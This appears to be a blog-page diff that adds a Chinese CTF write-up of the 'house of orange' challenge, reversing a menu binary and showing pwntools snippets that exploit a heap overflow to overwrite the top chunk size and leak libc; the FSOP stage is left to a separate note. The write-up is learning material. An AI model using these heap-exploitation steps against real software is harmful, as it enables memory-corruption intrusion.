@@ -8,7 +8,7 @@
 
 <head>
 
-  <title>Archives: 2021/4 | Rin</title>
+  <title>攻防世界 - house of orange | Rin</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -45,10 +45,13 @@
   
 
   <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"><link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
+<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
+</head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
       <!-- ============================ Off-canvas navigation =========================== -->
@@ -211,69 +214,148 @@
         <!-- ============================ Header & Logo bar =========================== -->
 
 
-      <!-- ============================ Hero Image =========================== -->
-
-<section id="hero" class="scrollme">
-    <div class="container-fluid element-img" style="background: url(https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/cover.jpg) no-repeat center center fixed;background-size: cover">
-        <div class="row">
-            <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
-                <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
-                    <div>
-                        
-                        <h2><span>RIN777</span></h2>
-                        <p></p>
-                        
-                        <h2></h2>
-                        <p>努力は嘘をつく、でも無駄にはならない</p>
-                        
-
-                    </div>
-                </div>
-            </div>
-            <!-- // .col-md-12 -->
-        </div>
-        <div class="herofade beige-dk"></div>
-    </div>
-</section>
-
-<!-- Height spacing helper -->
-<div class="heightblock"></div>
-<!-- // End height spacing helper -->
-
-<!-- ============================ END Hero Image =========================== -->
-
-
-
-
-<section id="services">
+      
+<section id="intro">
     <div class="container">
-        <div class="row">
-            <div class="col-md-10 col-md-offset-1">
-                <div class="row boxes">
-                    
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2021/04/24/sum_杂碎的指令/">杂碎的指令</a></h4>
-                            
-                            <p><time datetime="2021-04-23T16:50:26.062Z"><a href="/2021/04/24/sum_杂碎的指令/">2021-04-24</a></time></p>
-                        </div>
-                    
-                </div>
-            </div>    
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2022-04-10T09:02:58.445Z" itemprop="datePublished">
+          2022-04-10
+      </time>
+    
+    
+    | 
+    <a href='/tags/io-file/'>io_file</a>
+    
+    
+</span>
+                <h1>攻防世界 - house of orange</h1>
+            </div>
         </div>
-    </div>
-</section> 
+        <div class="col-md-8 col-md-offset-2">
+      		
+    <div id="aplayer-UXHovCAQ" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>“试着开心，好吗？”</p>
+
+
+<h1><span id="overview">overview</span></h1><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%885.05.46.png" alt="截屏2022-04-10 下午5.05.46"></p>
+<h1><span id="逆向">逆向</span></h1><p>​        没有free，只有增查改。</p>
+<p>​        这个题程序逻辑比较简单，主要是利用相对比较复杂。</p>
+<h2><span id="add">add</span></h2><p>​        最多申请三个house。并且在申请house开始为每个house创建了0x10 size的结构体，只有两个字段，size和content ptr。在输入name的阶段会把name读入content ptr指向的地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name :&quot;</span>);</span><br><span class="line"> read_str((<span class="keyword">void</span> *)chunk_struct_ptr[<span class="number">1</span>], size);</span><br></pre></td></tr></table></figure>
+
+<p>​        接着输入每个橘子的价钱和颜色。颜色不能自己指定，程序提供了一个抽象的菜单以供选择。我们看一下这个菜单。</p>
+<p>​        难绷。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%886.03.56.png" alt="截屏2022-04-10 下午6.03.56"></p>
+<p>​        价格被读入一个由<code>calloc()</code>创建的,只有一个size为8的item的chunk中。数量范围被限制在0-7或56746。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">read_str(*((<span class="keyword">void</span> **)chunk_struct_ptr + <span class="number">1</span>), size);</span><br><span class="line">price_chunk = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">8uLL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Price of Orange:&quot;</span>);</span><br><span class="line">*price_chunk = read_num();</span><br><span class="line">color_menu(); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Color of Orange:&quot;</span>);</span><br><span class="line">color_num = read_num();</span><br><span class="line"><span class="keyword">if</span> ( color_num != <span class="number">56746</span> &amp;&amp; (color_num &lt;= <span class="number">0</span> || color_num &gt; <span class="number">7</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( color_num == <span class="number">0xDDAA</span> )</span><br><span class="line">  	price_chunk[<span class="number">1</span>] = <span class="number">0xDDAA</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    price_chunk[<span class="number">1</span>] = color_num + <span class="number">30</span>;</span><br><span class="line">*chunk_struct_ptr = price_chunk;</span><br><span class="line">qword_203068 = chunk_struct_ptr;</span><br><span class="line">++idx;</span><br></pre></td></tr></table></figure>
+
+<p>​        </p>
+<p>​        </p>
+<p>​        当颜色为56746时，将对应price chunk的第二个字段覆盖为0xddaa。然后就直接把price_chunk的指针保存到<code>chunk_struct_ptr</code>的开头。接着把<code>chunk_struct_ptr</code>保存到bss段上。</p>
+<p>​        另外全程也没有看到和idx有关的指针操作，估计也是只能控制一个house。</p>
+<p>​        </p>
+<h2><span id="show">show</span></h2><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%888.26.14.png" alt="截屏2022-04-10 下午8.26.14"></p>
+<p>​        不得不说这个活整得真得很，，可爱。</p>
+<p>​        也就是，输入56746会获得橙色的橘子。</p>
+<p>​        所以两个show的逻辑基本一致，就是show出house的名字和价格，颜色就纯纯整活。</p>
+<h2><span id="edit">edit</span></h2><p>​        有很明显的堆溢出漏洞。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">  read_str((<span class="keyword">void</span> *)buf[<span class="number">1</span>], num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange: &quot;</span>);</span><br><span class="line">  v1 = (_DWORD *)*buf;</span><br><span class="line">  *v1 = read_num();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>ps：写菜单的时候不要看错了，这个“Name：”的冒号前面没有空格，蚌埠住了。</p>
+<h1><span id="利用">利用</span></h1><h2><span id="整体思路">整体思路</span></h2><p>​        这道题是经典题了，堆上的话肯定就是利用堆溢出修改top chunk size，以获得unsorted bin。但是后面的利用我就不会了，因为没有做过io_file的题。所以我自己做的话就做到获得unsorted bin为止了。</p>
+<h2><span id="修改top-chunk-size">修改top chunk size</span></h2><p>随便覆盖一些，果然能把top chunk size覆盖，因此我们可以计算需要覆盖的值。</p>
+<p>我这里的堆地址比较畸形，就是都是7f开头的，不过目前不影响，之前的top chunk size为0x20f91，地址是070，加起来正好是0x1000，所以我们只需要覆盖为f91就能实现页对齐。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xf91</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>
+
+<h2><span id="获得unsorted-binleak-libc">获得unsorted bin，leak libc</span></h2><p>​        然后直接申请一个0x1011大小的chunk，就获得了0x1011-0xf91 = 0x80大小的unsorted bin。</p>
+<p>![截屏2022-04-10 下午10.02.34](/Users/rin/Library/Application Support/typora-user-images/截屏2022-04-10 下午10.02.34.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1000</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">malloc_hook = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;malloc_hook =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(malloc_hook)))</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br></pre></td></tr></table></figure>
+
+<p>​        </p>
+<p>​        接下来就是io_file的利用了。</p>
+<h2><span id="fsop">FSOP</span></h2><p>​        由于之前从来咩有做过io_file，所以为了好归纳我就还是再开一篇笔记来专门做io_file的学习笔记吧。</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
         </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    
+    <a class="pull-right" href="../heap_learning_house_of_orange/">
+        house_of_orange trick学习 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
     </div>
 </section>
+
+<!-- Highlight.js -->
+
+<link rel="stylesheet"
+href="//highlightjs.org/static/demo/styles/atom-one-light.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js">
+</script>
+<script>
+hljs.initHighlightingOnLoad();
+
+</script>
+
+
       
 <!-- ============================ Footer =========================== -->
 
